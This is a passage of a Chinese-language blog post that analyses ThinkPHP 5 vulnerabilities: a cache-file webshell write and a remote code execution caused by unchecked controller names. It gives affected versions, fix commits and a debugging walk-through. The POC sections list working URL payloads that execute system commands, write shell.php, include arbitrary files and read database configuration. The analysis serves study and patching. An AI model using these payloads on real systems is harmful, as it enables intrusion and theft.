。</p></blockquote><p>漏洞利用前提：</p><ul><li><p>站点能够将缓存文件列出，并且用户可以得到路径</p></li><li><p>1、缓存使用文件方式并且缓存目录暴露在web目录下面<br>2、攻击者要能猜到开发者使用的缓存key</p></li><li><p>知道缓存类所设置的键名，这样才能找到 <strong>webshell</strong> 路径；其次如果按照官方说明开发程序， <strong>webshell</strong> 最终会被写到 <strong>runtime</strong> 目录下，而官方推荐 <strong>public</strong> 作为 <strong>web</strong> 根目录，所以即便我们写入了 <strong>shell</strong> ，也无法直接访问到；最后如果程序有设置 <strong>$this-&gt;options[‘prefix’]</strong> 的话，在没有源码的情况下，我们还是无法获得 <strong>webshell</strong> 的准确路径。</p></li><li><blockquote><p>5.0的部署建议是public目录作为web目录访问内容，其它都是web目录之外，当然，你必须要修改public/index.php中的相关路径</p></blockquote></li></ul><p>比如这里修改的index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Cache</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        Cache::set(<span class="string">&quot;name&quot;</span>,input(<span class="string">&quot;get.username&quot;</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Cache success&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p><strong>5.0.0&lt;=ThinkPHP5&lt;=5.0.10</strong></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>在ThinkPHP 的5.0.11 release 信息中：</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923172420.png" alt="image-20200923125619050"></p><p>更新了完善缓存驱动(安全更新)。再去查看commit记录。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923160412.png" alt="image-20200923130139007"></p><p>修复方式为将缓存文件的内容拼接到<code>&lt;?php ?&gt;</code> 标签之外，并且使用了<code>exit()</code>函数来退出当前脚本。</p><p>可下断点进行单步调试，观察整个参数在Cache类以及Request类下进过相关方法的过滤，转换，并最终写入了缓存文件的过程。</p><p>首先是<code>Cache::set(&quot;name&quot;,input(&quot;get.username&quot;));</code> 未实例化，所以为调用<code>autoload</code>方法，自动加载机制来进行一系列实例化操作。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923172411.png" alt="image-20200923161825336"></p><p>然后到helper.php 中的 <code>input</code>方法，判断请求的方法和请求的参数，此处为<code>get.username</code></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923172318.png" alt="image-20200923162505424"></p><p>然后返回过滤后的值，继续调用<code>Request</code> 类的 <code>get</code> 方法和 <code>Input</code> 方法（在TP5)中参数的处理都是这样的了，</p><p>经过<code>filterVaule</code>和<code>filterExp</code>函数进行特殊字符过滤和相关判段后返回给<code>$data</code></p><hr><p>然后来到Cache 类的<code>set</code>方法。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923172308.png" alt="image-20200923164241136"></p><p>调用了Cache 类的init 方法，该方法继续调用了 Config里的get方法，这些操作是在为缓存内容做一些初始化操作。然后再到Cache 类的 connect 方法，</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923172114.png" alt="image-20200923164824257"></p><p>为缓存文件的文件名进行md5返回。这里的<code>self::handler</code>为<code>think\cache\driver\File</code>类。所以会调用<code>File</code>类的<code>set</code>方法。该方法调用了<code>getCacheKey</code>方法来获取缓存文件的文件名。文件名的机制如下图，先是对<code>$name</code> md5，然后截取前两位作为目录名，后面部分作为文件名然后和<code>.php</code>后缀进行拼接。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923172102.png" alt="image-20200923165836437"></p><p>看看set方法的处理流程：</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923172037.png" alt="image-20200923170741256"></p><p>最后通过<code>file_put_contents</code>函数，将<code>$data</code>（参数内容可控，并且没有对data参数进行任何过滤等操作，只是序列化后拼接存储在文件中，这里的 <strong>$this-&gt;options[‘data_compress’]</strong> 变量默认情况下为 <strong>false</strong> ，所以数据不会经过 <strong>gzcompress</strong> 函数处理。虽然在序列化数据前面拼接了单行注释符 <strong>//</strong> ，但是我们可以通过注入换行符绕过该限制。） 写入<code>$filename</code>从而GetShell。</p><blockquote><p>最后如果程序有设置 <strong>$this-&gt;options[‘prefix’]</strong> 的话(也就是上上图中的设置文件名前缀的代码)，在没有源码的情况下，我们还是无法获得 <strong>webshell</strong> 的准确路径。</p></blockquote><h2 id="利用总结"><a href="#利用总结" class="headerlink" title="利用总结"></a>利用总结</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923173430.png"></p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>1，thinkphp3.2的版本请选择开启：DATA_CACHE_KEY 这样就算你使用的cms是开源的人家发现了这个也无法使用。<br>2，tp3.2-tp5  做好目录权限，除公共目录绝对不要让外部可访问</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923160412.png" alt="image-20200923130139007"></p><h1 id="RCE2-利用任意控制器调用RCE"><a href="#RCE2-利用任意控制器调用RCE" class="headerlink" title="RCE2(利用任意控制器调用RCE)"></a>RCE2(利用任意控制器调用RCE)</h1><blockquote><p>控制器过滤不严，结合直接返回类名的代码操作，导致可以用命名空间的方式来调用任意类的任意方法</p></blockquote><p>获取复现代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project --prefer-dist topthink&#x2F;think&#x3D;5.1.0 tpdemo</span><br></pre></td></tr></table></figure><p>修改composer.json 的  require 字段。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;require&quot;: &#123;</span><br><span class="line">    &quot;php&quot;: &quot;&gt;&#x3D;5.6.0&quot;,</span><br><span class="line">    &quot;topthink&#x2F;framework&quot;: &quot;5.1.30&quot;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure><p>composer update</p><p>相关参考资料：</p><p><strong>感觉自己分析的不好，要学习还是去看参考资料吧。</strong></p><p><a href="https://xz.aliyun.com/t/3570">https://xz.aliyun.com/t/3570</a></p><p><a href="https://www.smi1e.top/thinkphp-5-x-rce-%E5%88%86%E6%9E%90/">https://www.smi1e.top/thinkphp-5-x-rce-%E5%88%86%E6%9E%90/</a></p><h2 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h2><p><strong>5.1.x</strong> ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?s&#x3D;index&#x2F;\think\Request&#x2F;input&amp;filter[]&#x3D;system&amp;data&#x3D;pwd</span><br><span class="line">?s&#x3D;index&#x2F;\think\view\driver\Php&#x2F;display&amp;content&#x3D;&lt;?php phpinfo();?&gt;</span><br><span class="line">?s&#x3D;index&#x2F;\think\template\driver\file&#x2F;write&amp;cacheFile&#x3D;shell.php&amp;content&#x3D;&lt;?php phpinfo();?&gt;</span><br><span class="line">?s&#x3D;index&#x2F;\think\Container&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br><span class="line">?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br></pre></td></tr></table></figure><p><strong>5.0.x</strong> ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?s&#x3D;index&#x2F;think\config&#x2F;get&amp;name&#x3D;database.username # 获取配置信息</span><br><span class="line">?s&#x3D;index&#x2F;\think\Lang&#x2F;load&amp;file&#x3D;..&#x2F;..&#x2F;test.jpg    # 包含任意文件</span><br><span class="line">?s&#x3D;index&#x2F;\think\Config&#x2F;load&amp;file&#x3D;..&#x2F;..&#x2F;t.php     # 包含任意.php文件</span><br><span class="line">?s&#x3D;index&#x2F;\think\app&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;system&amp;vars[1][]&#x3D;id</span><br></pre></td></tr></table></figure><p>这里以以这个POC进行分析，ThinkPHP 版本为<code>5.1.30</code> </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;public&#x2F;index.php?s&#x3D;index&#x2F;\think\Container&#x2F;invokefunction&amp;function&#x3D;call_user_func_array&amp;vars[0]&#x3D;phpinfo&amp;vars[1][]&#x3D;1</span><br></pre></td></tr></table></figure><p>![image-20200923201833962](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20200923201833962.png)</p><h2 id="漏洞概述-1"><a href="#漏洞概述-1" class="headerlink" title="漏洞概述"></a>漏洞概述</h2><blockquote><p>漏洞存在于 <strong>ThinkPHP</strong> 底层没有对控制器名进行很好的合法性校验，导致在未开启强制路由的情况下，用户可以调用任意类的任意方法，最终导致 <strong>远程代码执行漏洞</strong> 的产生。</p></blockquote><h2 id="影响版本-1"><a href="#影响版本-1" class="headerlink" title="影响版本"></a>影响版本</h2><p><strong>5.0.7&lt;=ThinkPHP5&lt;=5.0.22</strong> 、<strong>5.1.0&lt;=ThinkPHP&lt;=5.1.30</strong></p><p>不同版本的Payload，需要做相关的调整。</p><h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>在5.1.31的更新中，查看相关更新的信息，其中关于<code>修正控制器名获取</code> 的commit</p><p>![image-20200923221710652](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20200923221710652.png)</p><p>另外，官方对于此处更新，专门发了一次微信公告。<a href="https://mp.weixin.qq.com/s/ie9Evj1Cedw4OomgkJug5A">https://mp.weixin.qq.com/s/ie9Evj1Cedw4OomgkJug5A</a></p><p>内容如下：</p><blockquote><p>本次版本更新主要涉及一个安全更新，由于框架对控制器名没有进行足够的检测会导致在没有开启强制路由的情况下可能的<code>getshell</code>漏洞，受影响的版本包括<code>5.0</code>和<code>5.1</code>版本，推荐尽快更新到最新版本。如果暂时无法更新到最新版本，请开启强制路由。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200924150733.png" alt="image-20200923225433768"></p><p>默认情况下，ThinkPHP 不开启强制路由，并且开启了路由器兼容模式，<code>s</code>。</p><p>5.1.31 修复地址：<a href="https://github.com/top-think/framework/commit/802f284bec821a608e7543d91126abc5901b2815">https://github.com/top-think/framework/commit/802f284bec821a608e7543d91126abc5901b2815</a></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200923224451.png" alt="image-20200923224445456"></p><p>两个关键点：</p><ul><li>控制器名</li><li>强制路由</li></ul><p>by 七月火师傅：</p><blockquote><p>在没有开启强制路由，说明我们可以使用路由兼容模式 <strong>s</strong> 参数，而框架对控制器名没有进行足够的检测，说明可能可以调用任意的控制器，那么我们可以试着利用 <code>http://site/?s=模块/控制器/方法</code> 来测试一下。在先前的 <strong>ThinkPHP SQL注入</strong> 分析文章中，我们都有提到所有用户参数都会经过 <strong>Request</strong> 类的 <strong>input</strong> 方法处理，该方法会调用 <strong>filterValue</strong> 方法，而 <strong>filterValue</strong> 方法中使用了 <strong>call_user_func</strong> ，那么我们就来尝试利用这个方法。</p></blockquote><p><a href="https://hack-for.fun/69fea760.html#SQL%E6%B3%A8%E5%85%A5%E5%9B%9B-select">https://hack-for.fun/69fea760.html#SQL%E6%B3%A8%E5%85%A5%E5%9B%9B-select</a></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200915232824.png"></p><p><code>call_user_func($filter,$value);</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:8000&#x2F;?s&#x3D;index&#x2F;\think\Request&#x2F;input&amp;filter[]&#x3D;system&amp;data&#x3D;pwd</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200924150312.png" alt="image-20200923230344961"></p><p>可以看到系统命令成功执行。</p><p>根据修复的内容：对控制器名的获取，直接在获取控制器的地方下断点，来进行调试。</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200924150235.png" alt="image-20200923231658510"></p><p>得出：控制器名是通过<code>$result[1]</code> 来获取的。</p><blockquote><p>而 <strong>$result</strong> 的值来源于兼容模式下的 <strong>pathinfo</strong> ，即 <strong>s</strong> 参数</p></blockquote><p>继续进行单步调试，程序会来到App类下的<code>run</code>方法</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200924150152.png" alt="image-20200924094001917"></p><p>继续调用<code>Dispatch</code>类的<code>run</code>方法，该方法调用了<code>exec</code> 方法</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $option = <span class="keyword">$this</span>-&gt;rule-&gt;getOption();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检测路由after行为</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($option[<span class="string">&#x27;after&#x27;</span>])) &#123;</span><br><span class="line">        $dispatch = <span class="keyword">$this</span>-&gt;checkAfter($option[<span class="string">&#x27;after&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($dispatch <span class="keyword">instanceof</span> Response) &#123;</span><br><span class="line">            <span class="keyword">return</span> $dispatch;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 数据自动验证</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($option[<span class="string">&#x27;validate&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;autoValidate($option[<span class="string">&#x27;validate&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $data = <span class="keyword">$this</span>-&gt;exec();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;autoResponse($data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">exec</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 监听module_init</span></span><br><span class="line">    <span class="keyword">$this</span>-&gt;app[<span class="string">&#x27;hook&#x27;</span>]-&gt;listen(<span class="string">&#x27;module_init&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 实例化控制器</span></span><br><span class="line">        $instance = <span class="keyword">$this</span>-&gt;app-&gt;controller(<span class="keyword">$this</span>-&gt;controller,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">&#x27;url_controller_layer&#x27;</span>),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">&#x27;controller_suffix&#x27;</span>),</span><br><span class="line">            <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">&#x27;empty_controller&#x27;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ($instance <span class="keyword">instanceof</span> Controller) &#123;</span><br><span class="line">            $instance-&gt;registerMiddleware();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException $e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> HttpException(<span class="number">404</span>, <span class="string">&#x27;controller not exists:&#x27;</span> . $e-&gt;getClass());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">$this</span>-&gt;app[<span class="string">&#x27;middleware&#x27;</span>]-&gt;controller(<span class="function"><span class="keyword">function</span> (<span class="params">Request $request, $next</span>) <span class="title">use</span> (<span class="params">$instance</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 获取当前操作名</span></span><br><span class="line">        $action = <span class="keyword">$this</span>-&gt;actionName . <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">&#x27;action_suffix&#x27;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (is_callable([$instance, $action])) &#123;</span><br><span class="line">            <span class="comment">// 执行操作方法</span></span><br><span class="line">            $call = [$instance, $action];</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 严格获取当前操作方法名</span></span><br><span class="line">            $reflect    = <span class="keyword">new</span> ReflectionMethod($instance, $action);</span><br><span class="line">            $methodName = $reflect-&gt;getName();</span><br><span class="line">            $suffix     = <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">&#x27;action_suffix&#x27;</span>);</span><br><span class="line">            $actionName = $suffix ? substr($methodName, <span class="number">0</span>, -strlen($suffix)) : $methodName;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;request-&gt;setAction($actionName);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 自动获取请求变量</span></span><br><span class="line">            $vars = <span class="keyword">$this</span>-&gt;rule-&gt;getConfig(<span class="string">&#x27;url_param_type&#x27;</span>)</span><br><span class="line">            ? <span class="keyword">$this</span>-&gt;request-&gt;route()</span><br><span class="line">            : <span class="keyword">$this</span>-&gt;request-&gt;param();</span><br><span class="line">            $vars = array_merge($vars, <span class="keyword">$this</span>-&gt;param);</span><br><span class="line">        &#125; <span class="keyword">elseif</span> (is_callable([$instance, <span class="string">&#x27;_empty&#x27;</span>])) &#123;</span><br><span class="line">            <span class="comment">// 空操作</span></span><br><span class="line">            $call    = [$instance, <span class="string">&#x27;_empty&#x27;</span>];</span><br><span class="line">            $vars    = [<span class="keyword">$this</span>-&gt;actionName];</span><br><span class="line">            $reflect = <span class="keyword">new</span> ReflectionMethod($instance, <span class="string">&#x27;_empty&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// 操作不存在</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> HttpException(<span class="number">404</span>, <span class="string">&#x27;method not exists:&#x27;</span> . get_class($instance) . <span class="string">&#x27;-&gt;&#x27;</span> . $action . <span class="string">&#x27;()&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">$this</span>-&gt;app[<span class="string">&#x27;hook&#x27;</span>]-&gt;listen(<span class="string">&#x27;action_begin&#x27;</span>, $call);</span><br><span class="line"></span><br><span class="line">        $data = <span class="keyword">$this</span>-&gt;app-&gt;invokeReflectMethod($instance, $reflect, $vars);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;autoResponse($data);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;app[<span class="string">&#x27;middleware&#x27;</span>]-&gt;dispatch(<span class="keyword">$this</span>-&gt;request, <span class="string">&#x27;controller&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$data = <span class="keyword">$this</span>-&gt;app-&gt;invokeReflectMethod($instance, $reflect, $vars);</span><br></pre></td></tr></table></figure><p>利用了反射机制，调用类的方法，这里类和方法都可控。</p><p>该方法中，<strong>未对实例化控制器和操作名进行任何过滤、合法性检测操作，这就是导致远程代码执行的直接原因。</strong></p><hr><p>如果直接拿该版本的 <strong>payload</strong> 去测试 <strong>ThinkPHP5.0.x</strong> 版本，会发现很多 <strong>payload</strong> 都不能成功。其原因是两个大版本已加载的类不同，导致可利用的类也不尽相同。具体如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br></pre></td><td class="code"><pre><span class="line">ThinkPHP 5.1.x                  ThinkPHP 5.0.x</span><br><span class="line">stdClass                        stdClass </span><br><span class="line">Exception                       Exception </span><br><span class="line">ErrorException                  ErrorException </span><br><span class="line">Closure                         Closure </span><br><span class="line">Generator                       Generator </span><br><span class="line">DateTime                        DateTime </span><br><span class="line">DateTimeImmutable               DateTimeImmutable </span><br><span class="line">DateTimeZone                    DateTimeZone </span><br><span class="line">DateInterval                    DateInterval </span><br><span class="line">DatePeriod                      DatePeriod </span><br><span class="line">LibXMLError                     LibXMLError </span><br><span class="line">DOMException                    DOMException </span><br><span class="line">DOMStringList                   DOMStringList </span><br><span class="line">DOMNameList                     DOMNameList </span><br><span class="line">DOMImplementationList           DOMImplementationList </span><br><span class="line">DOMImplementationSource         DOMImplementationSource </span><br><span class="line">DOMImplementation               DOMImplementation </span><br><span class="line">DOMNode                         DOMNode </span><br><span class="line">DOMNameSpaceNode                DOMNameSpaceNode </span><br><span class="line">DOMDocumentFragment             DOMDocumentFragment </span><br><span class="line">DOMDocument                     DOMDocument </span><br><span class="line">DOMNodeList                     DOMNodeList </span><br><span class="line">DOMNamedNodeMap                 DOMNamedNodeMap </span><br><span class="line">DOMCharacterData                DOMCharacterData </span><br><span class="line">DOMAttr                         DOMAttr </span><br><span class="line">DOMElement                      DOMElement </span><br><span class="line">DOMText                         DOMText </span><br><span class="line">DOMComment                      DOMComment </span><br><span class="line">DOMTypeinfo                     DOMTypeinfo </span><br><span class="line">DOMUserDataHandler              DOMUserDataHandler </span><br><span class="line">DOMDomError                     DOMDomError </span><br><span class="line">DOMErrorHandler                 DOMErrorHandler </span><br><span class="line">DOMLocator                      DOMLocator </span><br><span class="line">DOMConfiguration                DOMConfiguration </span><br><span class="line">DOMCdataSection                 DOMCdataSection </span><br><span class="line">DOMDocumentType                 DOMDocumentType </span><br><span class="line">DOMNotation                     DOMNotation </span><br><span class="line">DOMEntity                       DOMEntity </span><br><span class="line">DOMEntityReference              DOMEntityReference </span><br><span class="line">DOMProcessingInstruction        DOMProcessingInstruction </span><br><span class="line">DOMStringExtend                 DOMStringExtend </span><br><span class="line">DOMXPath                        DOMXPath </span><br><span class="line">finfo                           finfo </span><br><span class="line">LogicException                  